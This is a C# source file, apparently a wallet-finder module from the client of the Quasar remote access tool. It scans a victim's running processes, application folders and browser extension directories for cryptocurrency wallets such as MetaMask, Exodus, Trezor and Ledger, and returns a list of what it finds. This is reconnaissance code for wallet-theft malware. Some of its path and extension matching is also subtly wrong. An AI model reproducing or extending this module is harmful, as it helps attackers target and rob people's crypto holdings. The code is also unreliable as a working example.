using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Quasar.Client.WalletFinder
{
    class WalletFinder
    {
        private static readonly List<string> knownWallets = new List<string>
        {
            "MetaMask",
            "Exodus",
            "Trust Wallet",
            "Electrum",
            "Jaxx",
            "Coinbase",
            "Brave",
            "Opera",
            "Trezor",
            "Ledger",
        };

    private static readonly List<string> possiblePaths = new List<string>
        {
            @"C:\Program Files\Exodus",
            @"C:\Users\{0}\AppData\Local\Google\Chrome\User Data\Default\Extensions",
            @"C:\Users\{0}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions",
            @"C:\Users\{0}\AppData\Local\Opera Software\Opera Stable\Extensions",
            @"C:\Users\{0}\AppData\Roaming\Trezor",
            @"C:\Users\{0}\AppData\Roaming\Ledger Live",
        };

    public static List<string> FindWallets()
    {
        List<string> foundWallets = new List<string>();

        try
        {
            foreach (var process in Process.GetProcesses())
            {
                foreach (var wallet in knownWallets)
                {
                    if (process.ProcessName.IndexOf(wallet, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        foundWallets.Add(wallet);
                    }
                }
            }

            foreach (var path in possiblePaths)
            {
                string expandedPath = path.Replace("{0}", Environment.UserName);
                if (Directory.Exists(expandedPath))
                {
                    foreach (var wallet in knownWallets)
                    {
                        try
                        {
                            if (Directory.GetFiles(expandedPath).Any(file => file.IndexOf(wallet, StringComparison.OrdinalIgnoreCase) >= 0))
                            {
                                foundWallets.Add(wallet);
                            }
                        }
                        catch (UnauthorizedAccessException) { }
                    }
                }
            }

            foundWallets.AddRange(CheckBrowserExtensions());

            return foundWallets.Distinct().ToList();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error in wallet detection: {ex.Message}");
            return foundWallets;
        }
    }

    private static List<string> CheckBrowserExtensions()
    {
        List<string> detectedWallets = new List<string>();

        try
        {
            string[] browsers = { "Chrome", "Brave", "Opera" };
            foreach (var browser in browsers)
            {
                string browserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    $"{browser}Software\\{browser}-Browser\\User Data\\Default\\Extensions");

                if (Directory.Exists(browserPath))
                {
                    var extensionDirectories = Directory.GetDirectories(browserPath);
                    foreach (var dir in extensionDirectories)
                    {
                        if (dir.IndexOf("metamask", StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            detectedWallets.Add("MetaMask");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error checking browser extensions: {ex.Message}");
        }

        return detectedWallets;
    }
    public static string GetFoundWallets()
    {
        var wallets = FindWallets();
        if (wallets.Any())
        {
            return "" + string.Join("\n", wallets.Select(wallet => "" + wallet));
        }
        else
        {
            return "No wallets found.";
        }
    }
}
}
